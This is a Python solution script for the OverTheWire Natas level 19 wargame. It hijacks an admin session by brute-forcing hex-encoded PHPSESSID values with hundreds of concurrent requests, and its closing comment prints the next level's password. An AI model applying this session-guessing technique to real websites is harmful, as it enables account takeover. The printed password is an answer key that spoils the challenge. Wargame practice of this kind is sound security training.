from bs4 import BeautifulSoup
import requests
import concurrent.futures
import re

def try_id(sess_id):
    res = requests.get(url=url,auth=lvl_pass, params=my_params, cookies={'PHPSESSID':sess_id})
    serv = BeautifulSoup(res.text, 'html.parser').body.find('div').text.strip()
    if "You are an admin." in serv:
        x=  re.search(r"Password: [a-zA-Z0-9]{32}",serv)[0][10:]
        open("./passwords/natas20.pwd", 'w').write(x)


lvl = '19'
next_level = str(int(lvl)+1)
pwd = open(f"./passwords/{'natas'+'0'+lvl if len(lvl)==1 else 'natas'+lvl}.pwd", 'r').read().strip()
url = f'http://natas{lvl}.natas.labs.overthewire.org'
lvl_pass = requests.auth.HTTPBasicAuth(f'natas{lvl}',pwd)


my_params = {"username":"admin", "password":"whatever"}
sess_ids = ['3' + '3'.join(list(str(x))) + '2d61646d696e' for x in range(1,641)]
with concurrent.futures.ThreadPoolExecutor(max_workers=len(sess_ids)) as executor:
    executor.map(try_id, sess_ids)


'''
Turns out, shit, you actually just run thru all the sess id's until you get a preexisting admin session.
Not very exciting, but it works. Except this time with a bit of pattern recognition thrown in for fun.

Username: natas20
Password: guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH
'''
